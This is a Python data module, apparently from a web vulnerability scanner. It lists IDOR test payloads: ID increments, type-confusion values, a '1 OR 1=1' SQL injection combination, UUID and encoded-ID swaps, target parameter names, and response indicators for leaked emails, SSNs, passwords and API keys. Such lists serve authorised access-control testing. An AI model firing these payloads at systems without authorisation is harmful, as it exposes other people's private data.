"""
IDOR (Insecure Direct Object Reference) Payloads

Tests for:
- Numeric ID manipulation (user_id=1, user_id=2, etc.)
- UUID/GUID manipulation
- Encoded ID manipulation (base64, hex)
- Path-based IDOR (/api/users/1 -> /api/users/2)
- Parameter pollution for IDOR
"""

# Numeric ID manipulations
NUMERIC_IDOR_PAYLOADS = [
    # Basic ID manipulation
    {'original': '1', 'test': '2', 'type': 'increment'},
    {'original': '1', 'test': '0', 'type': 'zero'},
    {'original': '1', 'test': '-1', 'type': 'negative'},
    {'original': '1', 'test': '999999', 'type': 'large'},
    {'original': '1', 'test': '1.1', 'type': 'float'},
    {'original': '1', 'test': '1e0', 'type': 'scientific'},

    # Array/object injection
    {'original': '1', 'test': '[1,2]', 'type': 'array'},
    {'original': '1', 'test': '{"id":1}', 'type': 'object'},

    # Type confusion
    {'original': '1', 'test': 'true', 'type': 'boolean'},
    {'original': '1', 'test': 'null', 'type': 'null'},
    {'original': '1', 'test': '1 OR 1=1', 'type': 'sqli_combo'},
]

# UUID/GUID manipulations
UUID_IDOR_PAYLOADS = [
    # Null UUID
    {'pattern': r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
     'test': '00000000-0000-0000-0000-000000000000', 'type': 'null_uuid'},
    # All ones UUID
    {'pattern': r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
     'test': 'ffffffff-ffff-ffff-ffff-ffffffffffff', 'type': 'max_uuid'},
    # Increment last byte
    {'pattern': r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
     'test': 'INCREMENT_LAST', 'type': 'uuid_increment'},
]

# Encoded ID manipulations
ENCODED_IDOR_PAYLOADS = [
    # Base64 encoded IDs
    {'encoding': 'base64', 'original': 'MQ==', 'test': 'Mg==', 'decoded_orig': '1', 'decoded_test': '2'},
    {'encoding': 'base64', 'original': 'dXNlcjE=', 'test': 'dXNlcjI=', 'decoded_orig': 'user1', 'decoded_test': 'user2'},
    {'encoding': 'base64', 'original': 'YWRtaW4=', 'test': 'YWRtaW4=', 'decoded_orig': 'admin', 'decoded_test': 'admin'},

    # Hex encoded IDs
    {'encoding': 'hex', 'original': '31', 'test': '32', 'decoded_orig': '1', 'decoded_test': '2'},

    # URL encoded IDs
    {'encoding': 'url', 'original': '%31', 'test': '%32', 'decoded_orig': '1', 'decoded_test': '2'},
]

# Common IDOR parameters to test
IDOR_PARAM_NAMES = [
    # User-related
    'id', 'user_id', 'userId', 'user', 'uid', 'account_id', 'accountId',
    'profile_id', 'profileId', 'member_id', 'memberId', 'customer_id',

    # Document/resource related
    'doc_id', 'docId', 'document_id', 'file_id', 'fileId', 'report_id',
    'invoice_id', 'order_id', 'orderId', 'transaction_id', 'ticket_id',

    # Organization related
    'org_id', 'orgId', 'organization_id', 'company_id', 'team_id', 'group_id',

    # Generic
    'ref', 'reference', 'no', 'num', 'number', 'key', 'token', 'uuid', 'guid',
]

# IDOR detection indicators (when unauthorized access succeeds)
IDOR_SUCCESS_INDICATORS = [
    # Different user data returned
    'email', 'phone', 'address', 'ssn', 'credit_card', 'password',
    'api_key', 'secret', 'token', 'private',

    # Status indicators
    '"success": true', '"status": "ok"', '"authorized": true',
]

# IDOR failure indicators (proper access control)
IDOR_FAILURE_INDICATORS = [
    'unauthorized', 'forbidden', 'access denied', 'permission denied',
    'not found', '403', '401', 'invalid', 'error',
]


def get_all_idor_payloads():
    """Get all IDOR payloads for testing"""
    return {
        'numeric': NUMERIC_IDOR_PAYLOADS,
        'uuid': UUID_IDOR_PAYLOADS,
        'encoded': ENCODED_IDOR_PAYLOADS,
        'param_names': IDOR_PARAM_NAMES,
        'success_indicators': IDOR_SUCCESS_INDICATORS,
        'failure_indicators': IDOR_FAILURE_INDICATORS,
    }
